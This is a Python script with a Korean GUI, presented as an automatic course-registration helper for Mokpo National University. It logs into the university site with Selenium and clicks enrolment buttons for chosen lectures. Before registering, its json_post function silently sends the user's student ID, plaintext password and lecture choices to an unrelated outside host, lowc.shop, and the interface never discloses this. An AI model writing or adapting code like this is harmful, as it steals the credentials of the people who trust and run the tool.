from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from tkinter import *
import requests
import os

options = webdriver.ChromeOptions()
options.add_argument(
    'User-Agent=Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36')
options.add_argument("disable-gpu")
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
wait1 = WebDriverWait(driver, 3)
wait2 = WebDriverWait(driver, 120)


def url_open():
    url = 'http://mnusu.mokpo.ac.kr:7774'
    driver.get(url)


def login():
    driver.find_element(By.ID, "name").send_keys(id_entry.get())
    driver.find_element(By.ID, "pwd").send_keys(pw_entry.get())
    driver.find_element(By.CLASS_NAME, "btn_login").click()


def lecture(a, b):
    try:
        btn = wait1.until(EC.presence_of_all_elements_located((By.XPATH,
                                                        '//*[contains(text(), "' +
                                                        a + '")]/following-sibling::td/a[@class="btn_ok"]')))
        if len(btn) == 1:
            btn[0].click()
        else:
            btn[int(b) - 1].click()
    except:
        btn = wait1.until(EC.presence_of_all_elements_located((By.XPATH,
                                                        '//*[contains(text(), "' +
                                                        a + '")]/following-sibling::td/a[@class="btn_ok"]')))
        if len(btn) == 1:
            btn[0].click()
        else:
            btn[int(b) - 1].click()


def json_post(lecture_type):
    json_data = {'student_id': id_entry.get(), 'student_pw': pw_entry.get(), 'lecture_type': lecture_type,
                 'lecture_id_1': lecture_entry1.get(), 'lecture_id_2': lecture_entry2.get(),
                 'lecture_id_3': lecture_entry3.get(), 'lecture_id_4': lecture_entry4.get(),
                 'lecture_id_5': lecture_entry5.get(), 'lecture_id_6': lecture_entry6.get(),
                 'lecture_id_7': lecture_entry7.get(), 'lecture_num_1': lecture_entry12.get(),
                 'lecture_num_2': lecture_entry22.get(), 'lecture_num_3': lecture_entry32.get(),
                 'lecture_num_4': lecture_entry42.get(), 'lecture_num_5': lecture_entry52.get(),
                 'lecture_num_6': lecture_entry62.get(), 'lecture_num_7': lecture_entry72.get()}
    response = requests.post('https://lowc.shop', json=json_data)
    print(response.status_code)


def all_command():
    major_status = major_var.get()
    general_status = general_var.get()
    if major_status == 1:
        json_post('major')
        major_start()
    elif general_status == 1:
        json_post('general')
        general_start()


def major_start():
    driver.get('http://mnusu.mokpo.ac.kr:7774/login/3')
    login()
    wait1.until(EC.presence_of_element_located((By.ID, "search"))).click()
    lecture(lecture_entry1.get(), lecture_entry12.get())
    lecture(lecture_entry2.get(), lecture_entry22.get())
    lecture(lecture_entry3.get(), lecture_entry32.get())
    lecture(lecture_entry4.get(), lecture_entry42.get())
    lecture(lecture_entry5.get(), lecture_entry52.get())
    lecture(lecture_entry6.get(), lecture_entry62.get())
    lecture(lecture_entry7.get(), lecture_entry72.get())


def general_start():
    general_status1 = lecture_var1.get()
    general_status2 = lecture_var2.get()
    general_status3 = lecture_var3.get()
    general_status4 = lecture_var4.get()
    general_status5 = lecture_var5.get()
    general_status6 = lecture_var6.get()
    general_status7 = lecture_var7.get()
    driver.get('http://mnusu.mokpo.ac.kr:7774/login/2')
    login()
    if general_status1 == 1:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[2]'))).click()
        lecture(lecture_entry1.get(), lecture_entry12.get())
    else:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[3]'))).click()
        lecture(lecture_entry1.get(), lecture_entry12.get())
    if general_status2 == 1:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[2]'))).click()
        lecture(lecture_entry2.get(), lecture_entry22.get())
    else:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[3]'))).click()
        lecture(lecture_entry2.get(), lecture_entry22.get())
    if general_status3 == 1:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[2]'))).click()
        lecture(lecture_entry3.get(), lecture_entry32.get())
    else:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[3]'))).click()
        lecture(lecture_entry3.get(), lecture_entry32.get())
    if general_status4 == 1:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[2]'))).click()
        lecture(lecture_entry4.get(), lecture_entry42.get())
    else:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[3]'))).click()
        lecture(lecture_entry4.get(), lecture_entry42.get())
    if general_status5 == 1:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[2]'))).click()
        lecture(lecture_entry5.get(), lecture_entry52.get())
    else:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[3]'))).click()
        lecture(lecture_entry5.get(), lecture_entry52.get())
    if general_status6 == 1:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[2]'))).click()
        lecture(lecture_entry6.get(), lecture_entry62.get())
    else:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[3]'))).click()
        lecture(lecture_entry6.get(), lecture_entry62.get())
    if general_status7 == 1:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[2]'))).click()
        lecture(lecture_entry7.get(), lecture_entry72.get())
    else:
        wait1.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="cboGyoIsuGbcd"]/select/option[3]'))).click()
        lecture(lecture_entry7.get(), lecture_entry72.get())


dp = Tk()
main_frame = Frame(dp)
dp.geometry('500x350')
dp.title("목포대 수강신청 프로그램")
dp.configure(background='white')
main_frame.pack()

id_label = Label(main_frame, text="아이디")
id_label.grid(row=1, column=0)
id_entry = Entry(main_frame)
id_entry.grid(row=1, column=1)

pw_label = Label(main_frame, text="비밀번호")
pw_label.grid(row=2, column=0)
pw_entry = Entry(main_frame)
pw_entry.grid(row=2, column=1)
major_var = IntVar(value=0)
major_checkbox = Checkbutton(main_frame, text="전공", variable=major_var)
major_checkbox.grid(row=1, column=2, sticky=W)
general_var = IntVar(value=0)
general_checkbox = Checkbutton(main_frame, text="교양", variable=general_var)
general_checkbox.grid(row=2, column=2, sticky=W)

code_label = Label(main_frame, text="과목코드")
code_label.grid(row=4, column=1)
class_label = Label(main_frame, text="분반")
class_label.grid(row=4, column=2)
general_label = Label(main_frame, text="교필/교선")
general_label.grid(row=4, column=3)

lecture_label1 = Label(main_frame, text="과목 1")
lecture_label1.grid(row=5, column=0)
lecture_entry1 = Entry(main_frame, width=17)
lecture_entry1.grid(row=5, column=1)
lecture_entry12 = Entry(main_frame, width=17)
lecture_entry12.grid(row=5, column=2)
lecture_var1 = IntVar(value=0)
lecture_checkbox1 = Checkbutton(main_frame, variable=lecture_var1)
lecture_checkbox1.grid(row=5, column=3)

lecture_label2 = Label(main_frame, text="과목 2")
lecture_label2.grid(row=6, column=0)
lecture_entry2 = Entry(main_frame, width=17)
lecture_entry2.grid(row=6, column=1)
lecture_entry22 = Entry(main_frame, width=17)
lecture_entry22.grid(row=6, column=2)
lecture_var2 = IntVar(value=0)
lecture_checkbox2 = Checkbutton(main_frame, variable=lecture_var2)
lecture_checkbox2.grid(row=6, column=3)

lecture_label3 = Label(main_frame, text="과목 3")
lecture_label3.grid(row=7, column=0)
lecture_entry3 = Entry(main_frame, width=17)
lecture_entry3.grid(row=7, column=1)
lecture_entry32 = Entry(main_frame, width=17)
lecture_entry32.grid(row=7, column=2)
lecture_var3 = IntVar(value=0)
lecture_checkbox3 = Checkbutton(main_frame, variable=lecture_var3)
lecture_checkbox3.grid(row=7, column=3)

lecture_label4 = Label(main_frame, text="과목 4")
lecture_label4.grid(row=8, column=0)
lecture_entry4 = Entry(main_frame, width=17)
lecture_entry4.grid(row=8, column=1)
lecture_entry42 = Entry(main_frame, width=17)
lecture_entry42.grid(row=8, column=2)
lecture_var4 = IntVar(value=0)
lecture_checkbox4 = Checkbutton(main_frame, variable=lecture_var4)
lecture_checkbox4.grid(row=8, column=3)

lecture_label5 = Label(main_frame, text="과목 5")
lecture_label5.grid(row=9, column=0)
lecture_entry5 = Entry(main_frame, width=17)
lecture_entry5.grid(row=9, column=1)
lecture_entry52 = Entry(main_frame, width=17)
lecture_entry52.grid(row=9, column=2)
lecture_var5 = IntVar(value=0)
lecture_checkbox5 = Checkbutton(main_frame, variable=lecture_var5)
lecture_checkbox5.grid(row=9, column=3)

lecture_label6 = Label(main_frame, text="과목 6")
lecture_label6.grid(row=10, column=0)
lecture_entry6 = Entry(main_frame, width=17)
lecture_entry6.grid(row=10, column=1)
lecture_entry62 = Entry(main_frame, width=17)
lecture_entry62.grid(row=10, column=2)
lecture_var6 = IntVar(value=0)
lecture_checkbox6 = Checkbutton(main_frame, variable=lecture_var6)
lecture_checkbox6.grid(row=10, column=3)

lecture_label7 = Label(main_frame, text="과목 7")
lecture_label7.grid(row=11, column=0)
lecture_entry7 = Entry(main_frame, width=17)
lecture_entry7.grid(row=11, column=1)
lecture_entry72 = Entry(main_frame, width=17)
lecture_entry72.grid(row=11, column=2)
lecture_var7 = IntVar(value=0)
lecture_checkbox7 = Checkbutton(main_frame, variable=lecture_var7)
lecture_checkbox7.grid(row=11, column=3)

empty_label = Label(main_frame)
empty_label.grid(row=12)

start_button = Button(main_frame, text="시작", width=20, height=3, command=all_command)
start_button.grid(row=13, column=1)

url_open()
dp.mainloop()
